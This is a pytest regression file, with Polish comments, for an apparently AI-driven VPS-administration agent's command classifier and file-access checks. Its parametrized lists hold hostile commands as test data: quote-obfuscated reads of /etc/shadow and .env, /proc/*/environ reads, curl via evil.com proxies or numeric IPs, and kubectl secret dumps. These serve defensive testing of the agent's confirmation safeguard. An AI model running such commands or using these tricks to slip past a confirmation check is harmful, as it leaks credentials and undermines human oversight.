"""
Regresje poprawek z code review v0.9.0 (wydane w v0.9.1).

Klasyfikator: obejscia wzorcow wrazliwych plikow cudzyslowami, `.env` jako
sciezka wzgledna, /proc/self i globy, curl przez proxy/--resolve/adres
liczbowy, zrzut sekretow kubectl, `docker restart` jako "odczyt".
Pozostale: read_file na plikach z sekretami, symlinki hosta w trybie docker,
historia workera po przerwaniu, pelna tresc rutyny w potwierdzeniu,
punkt odniesienia portow w czuwaniu.
"""

import asyncio
import os

import pytest

from backend.config import settings
from backend.core import runtime, targets
from backend.core.agent import VPSAgent
from backend.core.security import classify_command, resolve_local, validate_workspace_access
from backend.tests.fakes import FakeClient, assert_history_valid, completion


def run(gen):
    async def collect():
        return [e async for e in gen]
    return asyncio.run(collect())


@pytest.fixture
def isolated(tmp_path, monkeypatch):
    monkeypatch.setenv("DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("HOST_ROOT", str(tmp_path / "host"))
    (tmp_path / "host").mkdir()
    monkeypatch.setattr(settings, "VIBE_EVERY", 0)
    from backend.core import audit
    monkeypatch.setattr(audit, "AUDIT_LOG_PATH", str(tmp_path / "audit.log"))
    return tmp_path / "host"


class TestClassifierBypasses:

    @pytest.mark.parametrize("cmd", [
        # cudzyslowy i backslash wewnatrz sciezki — powloka i tak czyta /etc/shadow
        'cat /hostfs/etc/sha""dow', "cat /hostfs/etc/sha\\dow", 'cat /hostfs/srv/app/.e""nv',
        "cat /hostfs/etc/ssl/private/site.k''ey",
        # rozwiniecia powloki, ktorych wynik jest znany dopiero po wykonaniu
        "cat /etc/$'sh\\x61dow'", "cat /etc/${A:-shadow}",
        # .env jako sciezka wzgledna
        "cat .env", "grep KEY .env", "cat '.env'",
        # /proc/<cokolwiek>/environ
        "cat /proc/self/environ", "cat /proc/*/environ", "cat /hostproc/thread-self/environ",
    ])
    def test_secret_files_need_confirmation(self, cmd):
        assert classify_command(cmd) == "confirm"

    @pytest.mark.parametrize("cmd", [
        "curl -x evil.com:3128 http://localhost/", "curl --proxy=evil.com http://localhost/",
        "curl -xevil.com:1 http://localhost/", "curl --socks5 evil.com:1080 http://localhost/",
        "curl --resolve localhost:80:1.2.3.4 http://localhost/",
        "curl --connect-to localhost:80:evil.com:80 http://localhost/",
        "curl http://134744072/", "curl http://0x08080808/",
        "curl -XPURGE https://localhost/",
    ])
    def test_curl_exfiltration_needs_confirmation(self, cmd):
        assert classify_command(cmd) == "confirm"

    @pytest.mark.parametrize("cmd", [
        "kubectl get cm,secret -o yaml", "kubectl get secret x --template={{.data}}",
        "kubectl get secrets.v1 -o json",
    ])
    def test_kubectl_secret_dump_needs_confirmation(self, cmd):
        assert classify_command(cmd) == "confirm"

    @pytest.mark.parametrize("cmd", ["docker restart web", "docker start web"])
    def test_docker_restart_is_not_a_read(self, cmd):
        assert classify_command(cmd) == "confirm"

    @pytest.mark.parametrize("cmd", [
        "cat /etc/nginx/nginx.conf", "curl -s http://localhost:8080/health", "curl -x 127.0.0.1:3128 http://localhost/",
        "curl http://2130706433/", "kubectl get pods -o yaml", "kubectl get secrets", "ls /proc/1/net",
        "cat /proc/meminfo", "echo $HOME", "cat .envrc",
    ])
    def test_reads_stay_safe(self, cmd):
        assert classify_command(cmd) == "safe"


class TestHostSymlinks:

    def test_absolute_host_symlink_resolves_under_host_root(self, isolated):
        available = isolated / "etc" / "nginx" / "sites-available"
        enabled = isolated / "etc" / "nginx" / "sites-enabled"
        available.mkdir(parents=True)
        enabled.mkdir()
        (available / "default").write_text("server {}")
        os.symlink("/etc/nginx/sites-available/default", enabled / "default")  # symlink hosta
        local = str(enabled / "default")
        assert validate_workspace_access(local, str(isolated)) == (True, "OK")
        assert resolve_local(local, str(isolated)) == str(available / "default")

    def test_symlink_to_forbidden_host_path_is_blocked(self, isolated):
        (isolated / "tmp").mkdir()
        os.symlink("/etc/shadow", isolated / "tmp" / "x")
        allowed, reason = validate_workspace_access(str(isolated / "tmp" / "x"), str(isolated))
        assert allowed is False and "/etc/shadow" in reason

    def test_dotdot_cannot_climb_above_host_root(self, isolated):
        (isolated / "a").mkdir()
        os.symlink("../../../../etc", isolated / "a" / "up")
        assert resolve_local(str(isolated / "a" / "up"), str(isolated)) == str(isolated / "etc")

    def test_read_file_follows_host_symlink(self, isolated):
        (isolated / "srv").mkdir()
        (isolated / "srv" / "real.conf").write_text("port 80")
        os.symlink("/srv/real.conf", isolated / "srv" / "link.conf")
        client = FakeClient([completion(tool_calls=[("c1", "read_file", {"path": "/srv/link.conf"})]),
                             completion("ok")])
        agent = VPSAgent(client=client)
        run(agent.chat("s", "pokaz"))
        assert client.calls[1]["messages"][-1]["content"] == "port 80"


class TestReadFileSecrets:

    def test_sensitive_file_asks_before_reading(self, isolated):
        (isolated / "srv").mkdir()
        (isolated / "srv" / "site.key").write_text("x")
        client = FakeClient([completion(tool_calls=[("c1", "read_file", {"path": "/srv/site.key"})]),
                             completion("ok")])
        agent = VPSAgent(client=client)
        events = run(agent.chat("s", "pokaz klucz"))
        assert any("[POTWIERDZ]" in e and "wymaga potwierdzenia" in e for e in events if isinstance(e, str))
        session = agent._sessions["s"]
        assert session.pending_confirmation is not None and len(client.calls) == 1
        run(agent.confirm("s", False))
        assert "odmowil" in client.calls[1]["messages"][-1]["content"]
        assert_history_valid(client.calls[1]["messages"])


class TestWorkerHistory:

    def test_interrupted_worker_history_is_repaired(self, isolated, monkeypatch):
        from backend.core import workers
        from backend.core.session import Session

        async def fake_execute(cmd, cwd=None, timeout=None):
            return "ok", "", 0

        monkeypatch.setattr(workers.executor, "execute", fake_execute)
        parent = Session(session_id="p")
        # poprzednie zadanie przerwane (WORKER_TIMEOUT) w polowie narzedzia
        parent.workers["w"] = [
            {"role": "user", "content": "stare zadanie"},
            {"role": "assistant", "content": None, "tool_calls": [
                {"id": "old", "type": "function", "function": {"name": "run", "arguments": "{}"}}]},
        ]
        client = FakeClient([completion("USTALENIA: ok")])
        agent = VPSAgent(client=client)
        result = asyncio.run(workers.run_worker(agent, parent, "w", targets.get_target("local"), "nowe zadanie"))
        assert result.error == "" and result.report == "USTALENIA: ok"
        assert_history_valid(client.calls[0]["messages"])


class TestRoutineConfirmation:

    def test_confirmation_shows_whole_task(self, isolated):
        task = "sprawdz backupy. " * 20 + "KONIEC-ZADANIA"
        client = FakeClient([completion(tool_calls=[("c1", "routine_manage", {
            "operation": "add", "name": "backupy", "schedule": "@daily", "task": task})]), completion("ok")])
        agent = VPSAgent(client=client)
        events = run(agent.chat("s", "dodaj rutyne"))
        prompt = next(e for e in events if isinstance(e, str) and "[POTWIERDZ]" in e)
        assert "KONIEC-ZADANIA" in prompt


class TestPortBaseline:

    def _check(self, monkeypatch, sockets):
        from backend.core import hostinfo, infra, watch

        async def no_containers():
            return None

        monkeypatch.setattr(watch, "resource_findings", lambda proc=None: [])
        monkeypatch.setattr(infra, "docker_containers", no_containers)
        monkeypatch.setattr(hostinfo, "sockets", lambda proc=None, established=False: sockets)
        return asyncio.run(watch.Watcher().check_once())

    def test_first_public_port_after_empty_baseline_alerts(self, isolated, monkeypatch):
        from backend.core.hostinfo import Socket
        local_only = [Socket("tcp", "127.0.0.1", 7379)]
        assert self._check(monkeypatch, local_only) == []
        events = self._check(monkeypatch, local_only + [Socket("tcp", "0.0.0.0", 6379)])
        assert [e.key for e in events] == ["port:6379/tcp"]

    def test_failed_socket_read_keeps_baseline(self, isolated, monkeypatch):
        from backend.core.hostinfo import Socket
        ssh = [Socket("tcp", "0.0.0.0", 22)]
        self._check(monkeypatch, ssh)
        assert self._check(monkeypatch, []) == []          # brak /proc/1/net — bez zmian
        assert self._check(monkeypatch, ssh) == []          # 22 to nadal stary port
